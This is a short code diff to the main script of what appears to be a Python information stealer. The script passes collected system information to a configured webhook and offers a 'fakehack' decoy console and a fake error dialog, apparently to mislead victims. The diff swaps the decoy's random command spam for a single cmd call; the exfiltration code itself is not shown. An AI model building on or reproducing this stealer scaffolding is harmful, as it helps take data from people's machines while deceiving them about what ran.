@@ -7,9 +7,7 @@ from components.systeminfo import SystemInfo
 from config import __CONFIG__
 from time import sleep
 import ctypes
-import random
-import subprocess
-import random
+import os
 
 
 def main(webhook):
@@ -39,9 +37,7 @@ if __name__ == '__main__':
     main(__CONFIG__['webhook'])
     
     if __CONFIG__['fakehack'] == True:
-        for i in range(100):
-            cmd = "echo " + " ".join([random.choice(["from components.systeminfo import SystemInfo", "import time", "import subprocess", "local", "print()", "const", "for i in range(1000):", "subprocess.call(cmd, shell=True)"]) for j in range(random.randint(1, 10))])
-            subprocess.call(cmd, shell=True)
+        os.system('cmd /k "date"') 
     else:
         if __CONFIG__['error'] == True:
             ctypes.windll.user32.MessageBoxW(None, __CONFIG__['errorm'], __CONFIG__['errort'], 0)
